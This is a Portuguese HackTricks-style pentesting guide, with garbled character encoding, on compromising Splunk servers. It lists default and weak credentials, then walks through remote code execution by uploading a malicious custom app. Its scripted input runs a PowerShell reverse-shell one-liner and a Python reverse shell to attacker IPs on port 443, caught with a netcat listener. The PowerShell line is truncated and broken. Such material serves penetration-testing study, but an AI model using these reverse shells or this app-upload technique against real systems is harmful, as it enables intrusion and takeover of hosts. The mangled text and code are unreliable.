## **Informa√ß√£o B√°sica**

O **Splunk** √© uma ferramenta de **an√°lise de logs** usada para coletar, analisar e visualizar dados. Embora n√£o tenha sido originalmente projetado para ser uma ferramenta SIEM, o Splunk √© frequentemente usado para **monitoramento de seguran√ßa e an√°lise de neg√≥cios**. As implanta√ß√µes do Splunk s√£o frequentemente usadas para armazenar **dados sens√≠veis** e podem fornecer uma riqueza de informa√ß√µes para um atacante se comprometidas.

**Porta padr√£o:** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
O servidor web do Splunk √© executado por padr√£o na porta 8000.
{% endhint %}

## Enumera√ß√£o

### Vers√£o Gratuita

O teste do Splunk Enterprise se converte em uma vers√£o gratuita ap√≥s 60 dias, que n√£o requer autentica√ß√£o. N√£o √© incomum que os administradores do sistema instalem um teste do Splunk para test√°-lo, que √© posteriormente esquecido. Isso se converter√° automaticamente na vers√£o gratuita que n√£o tem nenhum tipo de autentica√ß√£o, introduzindo uma falha de seguran√ßa no ambiente. Algumas organiza√ß√µes podem optar pela vers√£o gratuita devido a restri√ß√µes or√ßament√°rias, sem entender completamente as implica√ß√µes de n√£o ter gerenciamento de usu√°rio/papel.

### Credenciais Padr√£o

Em vers√µes mais antigas do Splunk, as credenciais padr√£o s√£o `admin:changeme`, que s√£o convenientemente exibidas na p√°gina de login. No entanto, a vers√£o mais recente do Splunk define credenciais durante o processo de instala√ß√£o. Se as credenciais padr√£o n√£o funcionarem, vale a pena verificar senhas fracas comuns, como `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Obter Informa√ß√µes

Depois de fazer login no Splunk, podemos navegar pelos dados, executar relat√≥rios, criar pain√©is, instalar aplicativos da biblioteca Splunkbase e instalar aplicativos personalizados. Voc√™ tamb√©m pode executar c√≥digo: o Splunk tem v√°rias maneiras de executar c√≥digo, como aplicativos Django do lado do servidor, pontos de extremidade REST, entradas com script e scripts de alerta. Um m√©todo comum de obter execu√ß√£o remota de c√≥digo em um servidor Splunk √© por meio do uso de uma entrada com script.

Al√©m disso, como o Splunk pode ser instalado em hosts Windows ou Linux, entradas com script podem ser criadas para executar scripts Bash, PowerShell ou Batch.

### Shodan

* `Constru√ß√£o do Splunk`

## RCE

### Criar Aplicativo Personalizado

Um aplicativo personalizado pode executar scripts Python, Batch, Bash ou PowerShell. Observe que o Splunk vem com Python instalado, ent√£o mesmo em sistemas Windows, voc√™ poder√° executar c√≥digo Python.

Voc√™ pode usar [este](https://github.com/0xjpuff/reverse\_shell\_splunk) pacote Splunk para nos ajudar. O diret√≥rio `bin` neste reposit√≥rio tem exemplos para [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) e [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Vamos seguir este processo passo a passo.

Para isso, primeiro precisamos criar um aplicativo Splunk personalizado usando a seguinte estrutura de diret√≥rio:
```shell-session
tree splunk_shell/

splunk_shell/
‚îú‚îÄ‚îÄ bin
‚îî‚îÄ‚îÄ default
```
O diret√≥rio **`bin`** conter√° quaisquer **scripts que pretendemos executar** (neste caso, um shell reverso do **PowerShell**), e o diret√≥rio padr√£o ter√° nosso arquivo `inputs.conf`. Nosso shell reverso ser√° um **PowerShell one-liner:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
O arquivo [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) informa ao Splunk **qual script executar** e quaisquer outras condi√ß√µes. Aqui definimos o aplicativo como habilitado e informamos ao Splunk para executar o script a cada 10 segundos. O intervalo √© sempre em segundos e a entrada (script) s√≥ ser√° executada se essa configura√ß√£o estiver presente.
```shell-session
cat inputs.conf 

[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Precisamos do arquivo `.bat`, que ser√° executado quando a aplica√ß√£o for implantada e executar√° a linha de comando do PowerShell.

O pr√≥ximo passo √© escolher `Instalar aplicativo a partir do arquivo` e fazer upload do aplicativo.

<figure><img src="../.gitbook/assets/image (4) (5) (1).png" alt=""><figcaption></figcaption></figure>

Antes de fazer o upload do aplicativo personalizado malicioso, vamos iniciar um ouvinte usando o Netcat ou o [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Na p√°gina `Upload app`, clique em procurar, escolha o tarball que criamos anteriormente e clique em `Upload`. **Assim que o aplicativo for carregado**, um **shell reverso ser√° recebido** e o status do aplicativo ser√° automaticamente alterado para `Enabled`.

#### Linux

Se estiv√©ssemos lidando com um **host Linux**, precisar√≠amos **editar o script Python `rev.py`** antes de criar o tarball e fazer o upload do aplicativo malicioso personalizado. O restante do processo seria o mesmo e obter√≠amos uma conex√£o de shell reverso em nosso ouvinte Netcat e estar√≠amos prontos para come√ßar.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE e Escalada de Privil√©gios

Na p√°gina a seguir, voc√™ pode encontrar uma explica√ß√£o de como esse servi√ßo pode ser abusado para escalar privil√©gios e obter persist√™ncia:

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
